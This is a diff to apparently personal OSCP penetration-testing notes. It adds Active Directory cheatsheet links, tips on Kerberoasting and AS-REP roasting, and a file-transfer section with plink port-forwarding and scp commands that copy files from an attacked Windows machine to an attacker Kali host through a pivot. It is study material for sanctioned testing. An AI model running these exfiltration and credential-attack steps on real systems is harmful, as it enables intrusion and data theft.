@@ -547,7 +547,8 @@ Check active sessions \(PowerView\):
 
 ## AD 
 
-Here it will be AD
+Check this cheatsheet: [https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md](#https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md)
+
 
 ### Post-Exploitation 
 
@@ -579,6 +580,8 @@ Make sure to check every **PSReadLine directory**for **Console history**, for **
 
 Make sure to check the **default password**\.
 
+Try **Kerberoasting**and **AS\-Rep**using valid credentials \(**Impacket suite**\), or a valid sessions \(**Rubeus**\)\.
+
 Also check this link: [https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#4fb1](#https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#4fb1)
 \.
 
@@ -609,3 +612,27 @@ If **valid credentials**are found, we should try **evil\-winrm**and **RDP**into 
 Use **crackmapexec**and **smbclient**to surf the shares\.
 
 Also check this link: [https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#b769](#https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#b769)
+
+
+### File Transfer 
+
+We can transfer files from the machine by port forwarding SCP port 6000 to 22 kali \(from the Pivot Machine\):
+
+```
+ .\plink.exe -ssh -l kali -pw "password" -N -L
+0.0.0.0:6000:127.0.0.1:22 {kali IP} 
+ ```
+
+
+If we don't have an interactive shell, we can use this to transfer using **scp**:
+Then we can transfer the files from the attacked machine:
+
+```
+ echo "y" | .\scp.exe -P 6000 file kali@{pivot IP}:file # this is to
+accespt the key
+echo "password" | .\scp.exe -P 6000 file kali@{pivot IP}:file # the
+actual transfer 
+ ```
+
+
+\!Always use **scp**from **putty**\(pscp\.exe\)\.
